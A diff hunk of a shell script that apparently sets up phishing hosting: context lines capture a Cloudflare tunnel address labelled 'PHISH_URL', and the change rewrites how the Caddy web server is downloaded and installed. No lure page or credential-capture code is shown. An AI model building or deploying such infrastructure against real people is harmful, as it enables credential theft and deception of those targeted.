@@ -21,8 +21,11 @@ done
 [ -n "$URL" ] && echo "PHISH_URL=$URL" || { echo "NO_TUNNEL_URL_FOUND"; tail -n 30 cloudflared.log; }
 HOST="${URL#https://}"
 
-echo "--- install caddy ---"
-curl -sL "https://github.com/caddyserver/caddy/releases/latest/download/caddy_2.9.1_linux_amd64.tar.gz" -o /tmp/caddy.tgz
+echo "--- install caddy (exact asset via API) ---"
+ASSET=$(curl -sL "https://api.github.com/repos/caddyserver/caddy/releases/latest" | grep -oE 'https://[^"]+_linux_amd64\.tar\.gz' | head -n1)
+[ -n "$ASSET" ] || ASSET="https://github.com/caddyserver/caddy/releases/download/v2.8.4/caddy_2.8.4_linux_amd64.tar.gz"
+echo "asset=$ASSET"
+curl -sL "$ASSET" -o /tmp/caddy.tgz
 tar -xzf /tmp/caddy.tgz -C /tmp caddy
 $SUDO cp /tmp/caddy /usr/local/bin/caddy
 caddy version
